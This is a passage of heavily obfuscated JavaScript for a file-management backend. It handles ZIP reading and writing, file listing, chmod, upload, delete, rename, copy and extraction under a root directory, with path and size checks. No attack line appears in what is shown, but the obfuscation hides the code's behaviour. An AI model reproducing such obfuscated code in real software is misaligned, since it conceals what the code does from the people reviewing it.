                return j[cD(0x873)](0x6054b50, 0x0), j[cD(0x118)](0x0, 0x4), j[cD(0x118)](0x0, 0x6), j[cD(0x118)](g, 0x8), j['writeUInt16LE'](g, 0xa), j['writeUInt32LE'](i[cD(0x7a3)], 0xc), j[cD(0x873)](f, 0x10), j[cD(0x118)](0x0, 0x14), b['RqNhR'](h, i), b[cD(0x306)](h, j), a0l['closeSync'](c), g;
            }
        };
    }
    static [a0aY(0x7f4)](a) {
        const cE = a0aY, b = {
                'zpbKE': function (n, o) {
                    return n - o;
                },
                'SzVqt': function (n, o) {
                    return n + o;
                },
                'QlUcK': function (n, o) {
                    return n === o;
                },
                'aJCCx': function (n, o) {
                    return n < o;
                },
                'UPpIl': cE(0x8a0),
                'fuJyB': function (n, o) {
                    return n + o;
                },
                'zUSIb': function (n, o) {
                    return n + o;
                },
                'qtniU': function (n, o) {
                    return n <= o;
                },
                'EvrnI': function (n, o) {
                    return n + o;
                },
                'JBvph': function (n, o) {
                    return n !== o;
                },
                'UiPJE': function (n, o) {
                    return n + o;
                },
                'qxlUk': function (n, o) {
                    return n + o;
                },
                'ylgBq': function (n, o) {
                    return n + o;
                },
                'CyUJv': function (n, o) {
                    return n + o;
                },
                'BGftt': function (n, o) {
                    return n + o;
                },
                'qtmYM': cE(0x3ef),
                'cPWmt': function (n, o) {
                    return n + o;
                },
                'tXSfm': function (n, o) {
                    return n !== o;
                },
                'BGTPA': function (n, o) {
                    return n & o;
                },
                'Ttqzs': function (n, o) {
                    return n !== o;
                },
                'Pnvcb': function (n, o) {
                    return n & o;
                },
                'WBSLb': function (n, o) {
                    return n === o;
                },
                'yURUs': function (n, o) {
                    return n <= o;
                },
                'uHUrF': function (n, o) {
                    return n + o;
                },
                'ggWWE': function (n, o) {
                    return n + o;
                },
                'FhYvG': function (n, o) {
                    return n <= o;
                },
                'VoxFe': function (n, o) {
                    return n + o;
                }
            }, c = a0l[cE(0x3ce)](a);
        let d = -0x1;
        const f = Math[cE(0x434)](0x0, b['zpbKE'](c[cE(0x7a3)], b[cE(0x43a)](0xffff, 0x16)));
        for (let n = b[cE(0x216)](c['length'], 0x16); n >= f; n--) {
            if (b[cE(0x2b6)](c['readUInt32LE'](n), 0x6054b50)) {
                d = n;
                break;
            }
        }
        if (b[cE(0x4c4)](d, 0x0))
            throw new Error(b['UPpIl']);
        const g = c[cE(0x58e)](b['fuJyB'](d, 0xa)), h = c[cE(0x431)](b['SzVqt'](d, 0xc)), j = c[cE(0x431)](b[cE(0x37b)](d, 0x10)), k = [];
        let l = j;
        const m = b[cE(0x15d)](j, h);
        for (let o = 0x0; o < g && b['qtniU'](b[cE(0x88b)](l, 0x2e), m); o++) {
            if (b[cE(0x65e)](c[cE(0x431)](l), 0x2014b50))
                break;
            const q = c[cE(0x58e)](l + 0x8), r = c['readUInt16LE'](b[cE(0x88b)](l, 0xa)), s = c[cE(0x431)](b[cE(0x525)](l, 0x10)), t = c[cE(0x431)](b['qxlUk'](l, 0x14)), u = c[cE(0x431)](b['ylgBq'](l, 0x18)), v = c[cE(0x58e)](b['fuJyB'](l, 0x1c)), w = c[cE(0x58e)](l + 0x1e), x = c[cE(0x58e)](l + 0x20), y = c['readUInt32LE'](l + 0x26), z = c[cE(0x431)](b[cE(0x304)](l, 0x2a)), A = c[cE(0x489)](b[cE(0x101)](l, 0x2e), b[cE(0x597)](b['zUSIb'](l, 0x2e), v))[cE(0x491)](b[cE(0x61d)]);
            l += b[cE(0x91c)](b[cE(0x1c1)](b[cE(0x43a)](0x2e, v), w), x);
            const B = {
                'name': A,
                'isDir': A[cE(0x389)]('/') || b['tXSfm'](b['BGTPA'](y, 0x10), 0x0),
                'method': r,
                'crc': s,
                'size': u,
                'compressedSize': t,
                'encrypted': b[cE(0x5f4)](b['Pnvcb'](q, 0x1), 0x0),
                'zip64': b[cE(0x2b6)](t, 0xffffffff) || b['WBSLb'](u, 0xffffffff) || z === 0xffffffff,
                'data': null
            };
            if (!B[cE(0x561)] && !B[cE(0x8e1)] && !B[cE(0x606)]) {
                if (b[cE(0x8ef)](b[cE(0x91c)](z, 0x1e), c[cE(0x7a3)]) && c['readUInt32LE'](z) === 0x4034b50) {
                    const C = c['readUInt16LE'](b[cE(0x8fd)](z, 0x1a)), D = c[cE(0x58e)](b[cE(0x597)](z, 0x1c)), E = b[cE(0x304)](b['ggWWE'](z, 0x1e), C) + D;
                    b[cE(0x7b1)](b[cE(0x15d)](E, t), c[cE(0x7a3)]) && (B['data'] = c[cE(0x489)](E, b['VoxFe'](E, t)));
                }
            }
            k[cE(0x75e)](B);
        }
        return k;
    }
    static [a0aY(0x3c7)](a) {
        const cF = a0aY, b = {
                'CNFFb': function (c, d) {
                    return c === d;
                }
            };
        if (b[cF(0x1ce)](a[cF(0x3da)], 0x0))
            return a[cF(0x318)];
        if (b[cF(0x1ce)](a[cF(0x3da)], 0x8))
            return a0n[cF(0x43b)](a[cF(0x318)]);
        throw new Error('Unsupported\x20zip\x20method:\x20' + a[cF(0x3da)]);
    }
}
class a0Y {
    static async ['listFiles'](a, b = ![]) {
        const cG = a0aY, c = {
                'yUViW': cG(0x6f1),
                'lrQNq': function (h, i) {
                    return h(i);
                },
                'yauuV': function (h, i) {
                    return h || i;
                },
                'siSAX': cG(0x2e8)
            }, d = a0o[cG(0x928)](a0P['FILE_ROOT'], c[cG(0x1ba)](a, '.'));
        if (!a0W(d))
            throw new Error(cG(0x41a));
        if (!a0l[cG(0x383)](d))
            throw new Error(c[cG(0x3a5)]);
        const f = [], g = h => {
                const cH = cG, i = a0l[cH(0x809)](h);
                for (const j of i) {
                    const k = a0o['join'](h, j), l = a0l['statSync'](k), m = new a0L();
                    m['name'] = j, m['path'] = a0o[cH(0x66f)](a0P[cH(0x724)], k), m['type'] = l[cH(0x4e4)]() ? c['yUViW'] : cH(0x8ff), m[cH(0x8fe)] = l[cH(0x8fe)], m[cH(0x839)] = l['mtime']['toISOString'](), m[cH(0x2d4)] = this[cH(0x14c)](l[cH(0x2d4)], l[cH(0x4e4)]()), m[cH(0x1cf)] = '0o' + (l[cH(0x2d4)] & 0x1ff)[cH(0x491)](0x8), m[cH(0x3b1)] = l['uid'] + ':' + l[cH(0x40c)], f[cH(0x75e)](m), b && l['isDirectory']() && c[cH(0x46e)](g, k);
                }
            };
        return g(d), f;
    }
    static async ['getFilePermissions'](a) {
        const cI = a0aY, b = {
                'kZfyf': function (d, f) {
                    return d(f);
                },
                'xlEjt': function (d, f) {
                    return d & f;
                },
                'jWFGx': cI(0x6f1),
                'UahIh': cI(0x8ff)
            }, c = [];
        for (const d of a) {
            const f = a0o[cI(0x928)](a0P[cI(0x724)], d);
            if (!b[cI(0x5f2)](a0W, f))
                continue;
            try {
                const g = a0l[cI(0x479)](f), h = this[cI(0x448)](f, a0l[cI(0x757)][cI(0x344)]), i = this[cI(0x448)](f, a0l[cI(0x757)][cI(0x150)]), j = this[cI(0x448)](f, a0l[cI(0x757)][cI(0x8a2)]), k = new a0M();
                k[cI(0x312)] = a0o[cI(0x66f)](a0P['FILE_ROOT'], f), k[cI(0x1f4)] = a0o[cI(0x8df)](f), k[cI(0x2d4)] = this[cI(0x14c)](g['mode'], g[cI(0x4e4)]()), k[cI(0x1cf)] = '0o' + b[cI(0x558)](g[cI(0x2d4)], 0x1ff)[cI(0x491)](0x8), k['type'] = g[cI(0x4e4)]() ? b[cI(0x395)] : b[cI(0x626)], k['readable'] = h, k[cI(0x867)] = i, k['executable'] = j, c['push'](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0aY(0x448)](a, b) {
        const cJ = a0aY;
        try {
            return a0l[cJ(0xf1)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0aY(0x1db)](a) {
        const cK = a0aY, b = {
                'hujxe': function (c, d) {
                    return c === d;
                },
                'EEtVT': 'string',
                'WfqRl': function (c, d, f) {
                    return c(d, f);
                }
            };
        if (typeof a === cK(0x53f))
            return a;
        if (b[cK(0x134)](typeof a, b[cK(0x90d)])) {
            const c = a['trim']();
            if (/^[0-7]{3,4}$/['test'](c))
                return b[cK(0x450)](parseInt, c, 0x8);
        }
        throw new Error(cK(0x67a));
    }
    static ['_formatMode'](a, b) {
        const cL = a0aY, c = {
                'LmLAZ': function (i, j) {
                    return i & j;
                },
                'iicMz': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = c['LmLAZ'](a, 0x1ff)[cL(0x491)](0x8)[cL(0x3de)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[cL(0x3e8)](parseInt, i, 0xa);
            h += f[cL(0x575)]((k, l) => j & 0x4 >> l ? k : '-')[cL(0x52c)]('');
        }
        return h;
    }
    static async [a0aY(0x5dd)](a, b = ![]) {
        const cM = a0aY, c = {
                'udfbd': function (g, h) {
                    return g(h);
                },
                'fTUHW': function (g, h) {
                    return g(h);
                },
                'NKugd': function (g, h) {
                    return g(h);
                },
                'xKcIs': cM(0x236),
                'CuKVl': cM(0x8e9)
            }, d = [];
        for (const [g, h] of Object[cM(0x4b8)](a)) {
            const i = a0o['resolve'](a0P[cM(0x724)], g);
            if (!c[cM(0x293)](a0W, i)) {
                d['push']({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[cM(0x891)]
                });
                continue;
            }
            try {
                const j = this[cM(0x1db)](h), k = m => {
                        const cN = cM;
                        a0l[cN(0x1e6)](m, j);
                    };
                if (b && a0l[cM(0x383)](i) && a0l[cM(0x479)](i)[cM(0x4e4)]()) {
                    const m = n => {
                        const cO = cM;
                        k(n);
                        const o = a0l['readdirSync'](n);
                        for (const p of o) {
                            const q = a0o['join'](n, p);
                            a0l[cO(0x479)](q)[cO(0x4e4)]() ? c['udfbd'](m, q) : c['fTUHW'](k, q);
                        }
                    };
                    c[cM(0x3f1)](m, i);
                } else
                    c[cM(0x293)](k, i);
                const l = j[cM(0x491)](0x8);
                d[cM(0x75e)]({
                    'path': g,
                    'requested': c['udfbd'](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d['push']({
                    'path': g,
                    'requested': c[cM(0x3f1)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[cM(0x309)],
                    'message': n[cM(0x49d)]
                });
            }
        }
        const f = d[cM(0x896)](o => o[cM(0x59c)] === 'ok')[cM(0x7a3)];
        return {
            'status': 'ok',
            'total': d[cM(0x7a3)],
            'success': f,
            'results': d
        };
    }
    static async [a0aY(0x321)](a) {
        const cP = a0aY, b = {
                'efUAf': function (h, i) {
                    return h(i);
                },
                'bDLll': cP(0x41a),
                'AqluT': function (h, i) {
                    return h > i;
                },
                'eVFXN': function (h, i) {
                    return h * i;
                },
                'KCOZR': 'base64',
                'uuUQy': cP(0x30c)
            }, c = a0o[cP(0x928)](a0P[cP(0x724)], a);
        if (!b[cP(0x6b0)](a0W, c))
            throw new Error(b[cP(0x174)]);
        const d = a0l[cP(0x479)](c);
        if (b[cP(0x5cb)](d[cP(0x8fe)], b[cP(0x80a)](0x400, 0x400)))
            throw new Error(cP(0x46a));
        const f = a0l['readFileSync'](c), g = this[cP(0x43e)](f);
        return {
            'status': 'ok',
            'path': a0o[cP(0x66f)](a0P[cP(0x724)], c),
            'content': g ? a0w[cP(0x68e)](f) : f['toString'](cP(0x3ef)),
            'encoding': g ? b[cP(0x8ab)] : b['uuUQy'],
            'is_binary': g,
            'size': d[cP(0x8fe)]
        };
    }
    static [a0aY(0x43e)](a) {
        const cQ = a0aY, b = {
                'dRWkD': function (c, d) {
                    return c === d;
                },
                'kvMaF': function (c, d) {
                    return c === d;
                }
            };
        if (!a || b[cQ(0x28e)](a[cQ(0x7a3)], 0x0))
            return ![];
        for (let c = 0x0; c < Math[cQ(0x5df)](a[cQ(0x7a3)], 0x200); c++) {
            if (b['kvMaF'](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async ['uploadFile'](a, b, c, d = null, f = null) {
        const cR = a0aY, g = {
                'iQFCV': function (l, m) {
                    return l(m);
                },
                'BZzwa': 'Access\x20denied:\x20path\x20outside\x20root',
                'bNqYU': function (l, m) {
                    return l > m;
                },
                'HaPHE': cR(0x46a),
                'dtSIV': function (l, m) {
                    return l !== m;
                },
                'qvldS': function (l, m) {
                    return l(m);
                },
                'rciFV': cR(0x243),
                'Ormgz': '.upload_chunks',
                'ffJBe': function (l, m) {
                    return l === m;
                }
            }, h = a0o[cR(0x928)](a0P['FILE_ROOT'], a);
        let j = h;
        b && (j = a0o[cR(0x52c)](h, b));
        if (!g[cR(0x84f)](a0W, j))
            throw new Error(g[cR(0x453)]);
        !a0l[cR(0x383)](a0o[cR(0x56e)](j)) && a0l[cR(0x3e3)](a0o[cR(0x56e)](j), { 'recursive': !![] });
        const k = a0w[cR(0x2a9)](c);
        if (g[cR(0x727)](k[cR(0x7a3)], a0P['MAX_UPLOAD_SIZE']))
            throw new Error(g[cR(0x760)]);
        if (d !== null && g[cR(0x7a0)](f, null)) {
            const l = g['qvldS'](Number, d), m = g['iQFCV'](Number, f);
            if (Number[cR(0x1a0)](l) || Number[cR(0x1a0)](m))
                throw new Error(g[cR(0x187)]);
            const n = a0o[cR(0x52c)](a0o[cR(0x56e)](j), g['Ormgz'], a0o[cR(0x8df)](j));
            !a0l[cR(0x383)](n) && a0l[cR(0x3e3)](n, { 'recursive': !![] });
            const o = a0o[cR(0x52c)](n, cR(0x12a) + l);
            a0l[cR(0x769)](o, k);
            const p = a0l[cR(0x809)](n)['filter'](s => s[cR(0x627)]('chunk_')), q = p[cR(0x7a3)], r = g[cR(0x66a)](q, m);
            if (r) {
                const s = a0l[cR(0x7d5)](j);
                for (let u = 0x0; u < m; u++) {
                    const v = a0o[cR(0x52c)](n, cR(0x12a) + u);
                    if (!a0l[cR(0x383)](v)) {
                        s['close']();
                        throw new Error('Missing\x20chunk\x20' + u);
                    }
                    s['write'](a0l['readFileSync'](v));
                }
                s[cR(0x71e)]();
                const t = a0o[cR(0x56e)](n);
                a0l['rmSync'](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[cR(0x7f8)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0o[cR(0x66f)](a0P['FILE_ROOT'], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l[cR(0x769)](j, k), {
            'status': 'ok',
            'path': a0o[cR(0x66f)](a0P[cR(0x724)], j),
            'received': k[cR(0x7a3)],
            'total': k[cR(0x7a3)],
            'chunked': ![]
        };
    }
    static async [a0aY(0x846)](a, b, c, d = null, f = null) {
        const cS = a0aY, g = {
                'aLYKX': function (k, l) {
                    return k || l;
                },
                'EBQOo': function (k, l) {
                    return k(l);
                },
                'HvAxJ': cS(0x41a),
                'hYCeo': function (k, l) {
                    return k > l;
                },
                'nDBzD': function (k, l) {
                    return k !== l;
                },
                'BBCJU': function (k, l) {
                    return k(l);
                },
                'QLQRp': cS(0x243),
                'nqIml': cS(0x372),
                'oCsKi': function (k, l) {
                    return k < l;
                },
                'nUBUq': cS(0x405)
            }, h = a0o['resolve'](a0P['FILE_ROOT'], g['aLYKX'](a, '.'));
        let j = h;
        b && (j = a0o[cS(0x52c)](h, b));
        if (!g['EBQOo'](a0W, j))
            throw new Error(g['HvAxJ']);
        !a0l['existsSync'](a0o['dirname'](j)) && a0l[cS(0x3e3)](a0o['dirname'](j), { 'recursive': !![] });
        if (g[cS(0x2f3)](c[cS(0x7a3)], a0P[cS(0x29b)]))
            throw new Error('File\x20too\x20large');
        if (g[cS(0x64e)](d, null) && g[cS(0x64e)](f, null)) {
            const k = Number(d), l = g[cS(0x690)](Number, f);
            if (Number[cS(0x1a0)](k) || Number['isNaN'](l))
                throw new Error(g['QLQRp']);
            const m = a0o[cS(0x52c)](a0o[cS(0x56e)](j), g[cS(0x180)], a0o[cS(0x8df)](j));
            !a0l[cS(0x383)](m) && a0l[cS(0x3e3)](m, { 'recursive': !![] });
            const n = a0o[cS(0x52c)](m, cS(0x12a) + k);
            a0l[cS(0x769)](n, c);
            const o = a0l[cS(0x809)](m)['filter'](r => r[cS(0x627)](cS(0x12a))), p = o['length'], q = p === l;
            if (q) {
                const r = [];
                for (let t = 0x0; g[cS(0x78d)](t, l); t++) {
                    const u = a0o['join'](m, 'chunk_' + t);
                    if (!a0l[cS(0x383)](u))
                        throw new Error(cS(0x6f8) + t);
                    r[cS(0x75e)](a0l[cS(0x3ce)](u));
                }
                a0l['writeFileSync'](j, Buffer[cS(0x322)](r));
                const s = a0o[cS(0x56e)](m);
                a0l[cS(0x77a)](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[cS(0x7f8)](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0o[cS(0x66f)](a0P['FILE_ROOT'], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': cS(0x2a3)
                };
            }
            return {
                'status': 'ok',
                'path': a0o[cS(0x66f)](a0P[cS(0x724)], j),
                'chunk_id': k,
                'completed': ![],
                'message': 'Chunk\x20' + k + cS(0x7eb)
            };
        }
        return a0l[cS(0x769)](j, c), {
            'status': 'ok',
            'path': a0o[cS(0x66f)](a0P[cS(0x724)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g[cS(0x56a)]
        };
    }
    static async [a0aY(0x257)](a) {
        const cT = a0aY, b = {
                'UXryg': function (g, h) {
                    return g(h);
                },
                'pYAlz': cT(0x41a),
                'TbTAQ': cT(0x19c)
            }, c = a0o[cT(0x928)](a0P[cT(0x724)], a);
        if (!b[cT(0x3a6)](a0W, c))
            throw new Error(b[cT(0x74a)]);
        if (!a0l['existsSync'](c))
            throw new Error(b[cT(0x2d8)]);
        const d = a0l[cT(0x479)](c), f = await a0l[cT(0x316)][cT(0x321)](c);
        return {
            'path': a0o[cT(0x66f)](a0P[cT(0x724)], c),
            'content': f,
            'size': d[cT(0x8fe)]
        };
    }
    static async [a0aY(0x591)](a) {
        const cU = a0aY, b = {
                'zEFBl': function (d, f) {
                    return d(f);
                },
                'PNrsj': cU(0x236),
                'gxweQ': 'deleted',
                'sFbDH': cU(0x8e9)
            }, c = [];
        for (const d of a) {
            const f = a0o['resolve'](a0P[cU(0x724)], d);
            if (!b[cU(0x76f)](a0W, f)) {
                c[cU(0x75e)]({
                    'path': d,
                    'status': b[cU(0x1f9)]
                });
                continue;
            }
            try {
                if (a0l['existsSync'](f)) {
                    const g = a0l[cU(0x479)](f);
                    g['isDirectory']() ? a0l[cU(0x77a)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l[cU(0x621)](f), c[cU(0x75e)]({
                        'path': d,
                        'status': b[cU(0x4f2)]
                    });
                } else
                    c['push']({
                        'path': d,
                        'status': cU(0x423)
                    });
            } catch (h) {
                c[cU(0x75e)]({
                    'path': d,
                    'status': b[cU(0x323)],
                    'message': h['message']
                });
            }
        }
        return c;
    }
    static async [a0aY(0x6e7)](a) {
        const cV = a0aY, b = {
                'zaIAm': function (d, f) {
                    return d(f);
                },
                'TebZE': cV(0x236)
            }, c = [];
        for (const [d, f] of Object[cV(0x4b8)](a)) {
            const g = a0o[cV(0x928)](a0P[cV(0x724)], d), h = a0o['resolve'](a0P[cV(0x724)], f);
            if (!b[cV(0x3c3)](a0W, g) || !b[cV(0x3c3)](a0W, h)) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': b[cV(0x636)]
                });
                continue;
            }
            try {
                const i = a0o[cV(0x56e)](h);
                !a0l['existsSync'](i) && a0l['mkdirSync'](i, { 'recursive': !![] }), a0l['renameSync'](g, h), c[cV(0x75e)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[cV(0x75e)]({
                    'from': d,
                    'to': f,
                    'status': cV(0x8e9),
                    'message': j[cV(0x49d)]
                });
            }
        }
        return c;
    }
    static async [a0aY(0x7e0)](a) {
        const cW = a0aY, b = {
                'UctYh': function (d, f, g) {
                    return d(f, g);
                },
                'EJvXv': function (d, f) {
                    return d(f);
                },
                'EzgUX': cW(0x236),
                'BuQdA': cW(0x423),
                'NwaLT': function (d, f, g) {
                    return d(f, g);
                },
                'LxXyh': cW(0x8e9)
            }, c = [];
        for (const [d, f] of Object['entries'](a)) {
            const g = a0o[cW(0x928)](a0P[cW(0x724)], d), h = a0o[cW(0x928)](a0P[cW(0x724)], f);
            if (!b['EJvXv'](a0W, g) || !b[cW(0x1b2)](a0W, h)) {
                c[cW(0x75e)]({
                    'from': d,
                    'to': f,
                    'status': b['EzgUX']
                });
                continue;
            }
            try {
                if (!a0l[cW(0x383)](g)) {
                    c[cW(0x75e)]({
                        'from': d,
                        'to': f,
                        'status': b[cW(0x793)]
                    });
                    continue;
                }
                const i = a0o[cW(0x56e)](h);
                !a0l[cW(0x383)](i) && a0l[cW(0x3e3)](i, { 'recursive': !![] });
                const j = a0l[cW(0x479)](g);
                if (j['isDirectory']()) {
                    if (a0l[cW(0x54b)])
                        a0l[cW(0x54b)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const cX = cW;
                            if (a0l['statSync'](l)[cX(0x4e4)]()) {
                                if (!a0l[cX(0x383)](m))
                                    a0l['mkdirSync'](m, { 'recursive': !![] });
                                for (const n of a0l[cX(0x809)](l)) {
                                    b[cX(0x774)](k, a0o['join'](l, n), a0o[cX(0x52c)](m, n));
                                }
                            } else
                                a0l['copyFileSync'](l, m);
                        };
                        b['NwaLT'](k, g, h);
                    }
                } else
                    a0l['copyFileSync'](g, h);
                c[cW(0x75e)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': b['LxXyh'],
                    'message': l[cW(0x49d)]
                });
            }
        }
        return c;
    }
    static async ['createDirectory'](a) {
        const cY = a0aY, b = {
                'otEwu': function (d, f) {
                    return d(f);
                },
                'InZiM': cY(0x41a)
            }, c = a0o['resolve'](a0P[cY(0x724)], a);
        if (!b[cY(0x62b)](a0W, c))
            throw new Error(b[cY(0x397)]);
        return a0l[cY(0x3e3)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0o[cY(0x66f)](a0P['FILE_ROOT'], c)
        };
    }
    static [a0aY(0x36f)](a) {
        const cZ = a0aY;
        return a0o[cZ(0x66f)](a0P[cZ(0x724)], a) || '.';
    }
    static async ['zipItems'](a, b, c = ![]) {
        const d0 = a0aY, d = {
                'VNria': function (k, l, m) {
                    return k(l, m);
                },
                'qzvXy': d0(0x4d8),
                'pJzmm': function (k, l) {
                    return k === l;
                },
                'RCEjF': function (k, l) {
                    return k(l);
                },
                'XXazu': d0(0x41a),
                'InePr': 'skipped',
                'Fufpt': function (k, l) {
                    return k || l;
                },
                'Nzatv': d0(0x8e9),
                'IxKKm': d0(0x27c)
            };
        if (!a)
            throw new Error(d[d0(0x110)]);
        if (!Array['isArray'](b) || d[d0(0x328)](b['length'], 0x0))
            throw new Error(d0(0x25a));
        const f = a0o[d0(0x928)](a0P['FILE_ROOT'], a);
        if (!d[d0(0x339)](a0W, f))
            throw new Error(d['XXazu']);
        if (a0l[d0(0x383)](f) && a0l[d0(0x479)](f)[d0(0x4e4)]())
            throw new Error(d0(0x1e8) + a);
        a0l[d0(0x3e3)](a0o[d0(0x56e)](f), { 'recursive': !![] });
        if (a0l['existsSync'](f))
            a0l[d0(0x621)](f);
        const g = a0X[d0(0x750)](f), h = [];
        let i = 0x0, j = ![];
        for (const k of b) {
            if (j) {
                h[d0(0x75e)]({
                    'item': k,
                    'status': d[d0(0x850)],
                    'added': 0x0
                });
                continue;
            }
            const l = a0o[d0(0x928)](a0P[d0(0x724)], d[d0(0x81b)](k, ''));
            try {
                if (!d[d0(0x339)](a0W, l)) {
                    h[d0(0x75e)]({
                        'item': k,
                        'status': d[d0(0x5fb)],
                        'added': 0x0
                    });
                    continue;
                }
                if (!a0l[d0(0x383)](l)) {
                    h[d0(0x75e)]({
                        'item': k,
                        'status': d0(0x423),
                        'added': 0x0
                    });
                    continue;
                }
                const m = a0l[d0(0x479)](l);
                let n = 0x0, o = ![];
                if (m[d0(0x34d)]()) {
                    if (!g[d0(0x29c)](a0o['basename'](l), a0l[d0(0x3ce)](l), m[d0(0x839)])) {
                        j = !![], h[d0(0x75e)]({
                            'item': k,
                            'status': d[d0(0x850)],
                            'added': 0x0
                        });
                        continue;
                    }
                    n = 0x1;
                } else {
                    if (m[d0(0x4e4)]()) {
                        const p = a0o['basename'](l), q = (r, s) => {
                                const d1 = d0;
                                for (const t of a0l[d1(0x809)](r)) {
                                    const u = a0o[d1(0x52c)](r, t), v = s ? s + '/' + t : t, w = a0l['statSync'](u);
                                    if (w[d1(0x4e4)]()) {
                                        if (!g[d1(0x29c)](v + '/', Buffer[d1(0x744)](0x0), w[d1(0x839)], !![])) {
                                            o = !![];
                                            return;
                                        }
                                        d['VNria'](q, u, v);
                                        if (o)
                                            return;
                                    } else {
                                        if (w['isFile']()) {
                                            if (!g[d1(0x29c)](v, a0l[d1(0x3ce)](u), w['mtime'])) {
                                                o = !![];
                                                return;
                                            }
                                            n++;
                                        }
                                    }
                                }
                            };
                        q(l, c ? '' : p);
                    } else {
                        h[d0(0x75e)]({
                            'item': k,
                            'status': d[d0(0x5fb)],
                            'added': 0x0
                        });
                        continue;
                    }
                }
                if (o) {
                    j = !![], i += n, h['push']({
                        'item': k,
                        'status': d[d0(0x37a)],
                        'added': n
                    });
                    continue;
                }
                i += n, h['push']({
                    'item': k,
                    'status': 'ok',
                    'added': n
                });
            } catch (r) {
                h[d0(0x75e)]({
                    'item': k,
                    'status': d[d0(0x5fb)],
                    'added': 0x0
                });
            }
        }
        return g[d0(0x92b)](), {
            'status': 'ok',
            'path': a0Y['_displayPath'](f),
            'entries': i,
            'size': a0l[d0(0x383)](f) ? a0l['statSync'](f)[d0(0x8fe)] : 0x0,
            'results': h
        };
    }
    static async [a0aY(0x76a)](a, b, c = !![], d = null) {
        const d2 = a0aY, f = {
                'nsAJV': d2(0x4d8),
                'wuhxL': function (p, q) {
                    return p(q);
                },
                'rvRXD': d2(0x41a),
                'fECOS': function (p, q) {
                    return p >= q;
                },
                'DBEki': function (p, q) {
                    return p + q;
                },
                'MtnFG': function (p, q) {
                    return p >= q;
                },
                'QKCDi': function (p, q) {
                    return p + q;
                },
                'Jbapq': function (p, q) {
                    return p(q);
                },
                'OnYWo': function (p, q) {
                    return p < q;
                }
            };
        if (!a)
            throw new Error(f['nsAJV']);
        const g = a0o['resolve'](a0P['FILE_ROOT'], a);
        if (!f[d2(0x168)](a0W, g))
            throw new Error(d2(0x41a));
        if (!a0l[d2(0x383)](g))
            throw new Error(d2(0x608) + a);
        if (a0l[d2(0x479)](g)[d2(0x4e4)]())
            throw new Error(d2(0x17f) + a);
        let h;
        if (b) {
            h = a0o[d2(0x928)](a0P[d2(0x724)], b);
            if (!f[d2(0x168)](a0W, h))
                throw new Error(f[d2(0x4ca)]);
            if (a0l[d2(0x383)](h) && !a0l[d2(0x479)](h)[d2(0x4e4)]())
                throw new Error(d2(0x13e) + b);
        } else
            h = a0o[d2(0x56e)](g);
        a0l['mkdirSync'](h, { 'recursive': !![] });
        let i;
        try {
            i = a0X[d2(0x7f4)](g);
        } catch (p) {
            throw new Error(d2(0x398) + a);
        }
        const j = (d || [])[d2(0x896)](q => q);
        let k = 0x0, l = 0x0, m = 0x0;
        const n = [];
        let o = ![];
        for (const q of i) {
            if (q[d2(0x561)])
                continue;
            if (f[d2(0x7c6)](f[d2(0x2e6)](k, l), a0X[d2(0x2b4)]) || f[d2(0x58a)](m, a0X[d2(0x2b7)])) {
                l++;
                continue;
            }
            const r = q[d2(0x1f4)][d2(0x655)](/\\/g, '/');
            if (j[d2(0x7a3)]) {
                const v = r[d2(0x140)]('/')[d2(0x8c0)]();
                if (!j[d2(0x4f6)](r) && !j['includes'](v)) {
                    l++;
                    continue;
                }
            }
            if (q['encrypted'] || q[d2(0x606)] || f['QKCDi'](m, q[d2(0x8fe)]) > a0X[d2(0x2b7)]) {
                l++;
                continue;
            }
            const s = a0o[d2(0x928)](h, r), t = a0o[d2(0x66f)](h, s);
            if (t['startsWith']('..') || a0o[d2(0x798)](t)) {
                l++;
                continue;
            }
            if (!f['Jbapq'](a0W, s)) {
                l++;
                continue;
            }
            let u;
            try {
                u = a0X['inflate'](q);
            } catch (w) {
                l++;
                continue;
            }
            if (a0X[d2(0x71d)](u) !== q[d2(0x3ec)]) {
                l++;
                continue;
            }
            if (!c && a0l['existsSync'](s)) {
                l++;
                continue;
            }
            try {
                a0l['mkdirSync'](a0o['dirname'](s), { 'recursive': !![] }), a0l[d2(0x769)](s, u);
            } catch (x) {
                l++;
                continue;
            }
            k++, m += q['size'], f['OnYWo'](n[d2(0x7a3)], a0X['ZIP_MAX_LISTED_FILES']) ? n[d2(0x75e)](a0Y[d2(0x36f)](s)) : o = !![];
        }
        return {
            'status': 'ok',
            'path': a0Y[d2(0x36f)](g),
            'dest': a0Y[d2(0x36f)](h),
            'extracted': k,
            'skipped': l,
            'files': n,
            'files_truncated': o
        };
    }
}
class a0Z {
    static [a0aY(0x885)] = a0aY(0x63f);
    static [a0aY(0x1fe)] = 0x1;
    static [a0aY(0x5e5)] = {
        'enabled': ![],
        'locked': ![],
        'path': null,
        'key': null,
        'lastSavedAt': null
    };
    static [a0aY(0x13d)]() {
        const d3 = a0aY;
        for (const a of [
                process.env.USERPROFILE,
                process.env.HOME
            ]) {
            if (a && a0l[d3(0x383)](a))
                return a;
        }
        try {
            return a0p[d3(0x16c)]() || process[d3(0x133)]();
        } catch (b) {
            return process[d3(0x133)]();
        }
